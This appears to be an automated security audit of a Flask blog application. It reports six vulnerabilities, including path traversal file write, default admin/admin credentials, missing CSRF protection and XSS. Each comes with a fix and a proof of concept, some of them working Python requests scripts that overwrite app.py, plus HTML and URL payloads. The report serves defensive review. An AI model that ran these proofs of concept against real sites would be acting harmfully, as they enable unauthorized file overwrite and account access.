# Auto Security Analysis of blog.eletrix.fr at 2026-02-20

## CRITICAL - Arbitrary File Write and Deletion via Path Traversal in File Upload

The `/upload/` route takes the filename directly from the uploaded file and joins it with a temporary directory without sanitization. An attacker can use `../` in the filename to overwrite any file on the system that the application has permissions for. If the `add_watermark` function fails (e.g., because the file is not a valid image), the `os.remove()` call might be skipped in some error flows or the file remains overwritten with malicious content.

### PoC

```python
import requests

# Target URL
base_url = "http://localhost:5000"

# Start a session to maintain login
s = requests.Session()

# Login with default credentials
s.post(f"{base_url}/login", data={"username": "admin", "password": "admin"})

# Attempt to overwrite app.py using path traversal
files = {"file": ("../app.py", "print('pwned')", "image/png")}
r = s.post(f"{base_url}/upload/", files=files)

if r.status_code == 500:
    print("Exploit triggered (Server error often indicates successful overwrite followed by watermark failure)")
```

### Fix

Use `werkzeug.utils.secure_filename` to sanitize the filename before using it in `os.path.join`.

```python
from werkzeug.utils import secure_filename

filename = secure_filename(file.filename)
temp_path = os.path.join(TEMP_DIR, filename)
file.save(temp_path)
```

## CRITICAL - Arbitrary File Write via Path Traversal in Create Post

The `/create_post` route uses the `title` field from the form to create a filename without any sanitization. This allows an authenticated user to write `.md` files anywhere on the system.

### PoC

```python
import requests

base_url = "http://localhost:5000"
s = requests.Session()
s.post(f"{base_url}/login", data={"username": "admin", "password": "admin"})

# Attempt to write a file in the parent directory
data = {
    "title": "../../exploit",
    "author": "attacker",
    "tags": "test",
    "content": "pwned"
}
s.post(f"{base_url}/create_post", data=data)
```

### Fix

Sanitize the `title` field and ensure the resulting path is within the designated articles directory.

## MEDIUM - Insecure Default Credentials

The application uses `admin/admin` as default credentials in `utils.py` if environment variables are not provided. This makes the administrative interface easily accessible to attackers.

### PoC

Simply navigate to `/login` and enter `admin` for both username and password.

### Fix

Remove default credentials and ensure the application fails to start if `ADMIN_USERNAME` and `ADMIN_PASSWORD` are not set in the environment.

## MEDIUM - Lack of CSRF Protection

The application does not implement Cross-Site Request Forgery (CSRF) protection. An attacker can trick a logged-in administrator into performing sensitive actions like uploading files or creating posts by hosting a malicious form on another site.

### PoC

```html
<form action="http://localhost:5000/upload/" method="POST" enctype="multipart/form-data">
  <input type="file" name="file">
  <script>document.forms[0].submit()</script>
</form>
```

### Fix

Use a library like `Flask-WTF` to implement CSRF tokens for all state-changing requests.

## LOW - Cross-Site Scripting (XSS) in Post Content

Post content is rendered using the `|safe` filter in `post.html`, which disables HTML escaping. Since the markdown conversion does not sanitize the resulting HTML, an attacker with post-creation privileges can inject malicious scripts.

### PoC

Create a post with the following content:
```
<script>alert('XSS')</script>
```

### Fix

Remove the `|safe` filter from `{{ content|safe }}` in `post.html` or use a library like `bleach` to sanitize the HTML after markdown conversion.

## LOW - Path Traversal in Post View

The `/post/<name>` route allows an attacker to read any `.md` file on the system by using path traversal in the `name` parameter.

### PoC

Access the following URL to read the project's README:
`http://localhost:5000/post/..%2fREADME`

### Fix

Sanitize the `name` parameter to prevent path traversal.

## Summary of Vulnerabilities

| Severity | Vulnerability Name |
| :--- | :--- |
| CRITICAL | Arbitrary File Write and Deletion via Path Traversal in File Upload |
| CRITICAL | Arbitrary File Write via Path Traversal in Create Post |
| MEDIUM | Insecure Default Credentials |
| MEDIUM | Lack of CSRF Protection |
| LOW | Cross-Site Scripting (XSS) in Post Content |
| LOW | Path Traversal in Post View |
